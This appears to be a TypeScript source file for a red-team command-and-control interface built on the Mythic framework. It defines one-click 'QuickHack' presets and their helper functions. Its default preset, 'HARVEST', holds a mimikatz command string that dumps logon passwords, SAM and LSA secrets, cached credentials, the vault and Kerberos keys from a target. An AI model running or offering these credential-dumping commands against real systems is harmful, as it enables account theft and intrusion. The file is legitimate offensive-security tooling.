import { useMemo } from 'react';
import { useGetMythicSetting } from '../../components/MythicComponents/MythicSavedUserSetting';

export interface QuickHackVariable {
    key: string;          // placeholder name used in params, e.g. "TARGET_IP"
    type: 'ip' | 'port';
}

export interface QuickHackDef {
    id: string;
    name: string;
    description: string;
    icon: string;       // emoji or symbol
    color: string;      // accent color hex
    command: string;    // Mythic command name
    params: string;     // command params — use {{KEY}} to reference variables
    variables?: QuickHackVariable[];
}

/** Parse params string to detect {{KEY}} placeholders and match them to defined variables */
export function resolveParams(params: string, variables: QuickHackVariable[], values: Record<string, string>): string {
    let resolved = params;
    for (const v of variables) {
        resolved = resolved.replaceAll(`{{${v.key}}}`, values[v.key] ?? '');
    }
    return resolved;
}

/** Check if a QuickHack requires user input before execution */
export function hackNeedsInput(hack: QuickHackDef): boolean {
    return Array.isArray(hack.variables) && hack.variables.length > 0;
}

/** Extract all IP addresses from a callback ip field (may be JSON array or plain string) */
export function extractAllIPs(ip: any): string[] {
    if (!ip) return [];
    let candidates: string[] = [];
    if (typeof ip === 'string') {
        const trimmed = ip.trim();
        if (trimmed.startsWith('[')) {
            try { candidates = JSON.parse(trimmed); } catch { candidates = [trimmed]; }
        } else {
            candidates = [trimmed];
        }
    } else if (Array.isArray(ip)) {
        candidates = ip.map(String);
    } else {
        return [String(ip)];
    }
    return candidates.map(c => c.trim()).filter(Boolean);
}

export const DEFAULT_QUICKHACKS: QuickHackDef[] = [
    {
        id: 'harvest',
        name: 'HARVEST',
        description: 'Extract credentials, tokens, cached secrets & encryption keys from target memory',
        icon: '⚡',
        color: '#ff003c',
        command: 'mimikatz',
        params: '"privilege::debug" "sekurlsa::logonpasswords" "token::elevate" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "vault::cred /patch" "sekurlsa::ekeys" exit',
        variables: [],
    },
];

export const QUICKHACK_SETTING_KEY = 'minerva_quickhacks';

export function useQuickHacks(): QuickHackDef[] {
    const stored = useGetMythicSetting({
        setting_name: QUICKHACK_SETTING_KEY,
        default_value: DEFAULT_QUICKHACKS,
    });
    return useMemo(() => {
        if (!Array.isArray(stored) || stored.length === 0) return DEFAULT_QUICKHACKS;
        // Migrate old format: strip ramCost, ensure variables array exists
        return (stored as any[]).map(h => ({
            ...h,
            variables: Array.isArray(h.variables) ? h.variables : [],
        })) as QuickHackDef[];
    }, [stored]);
}
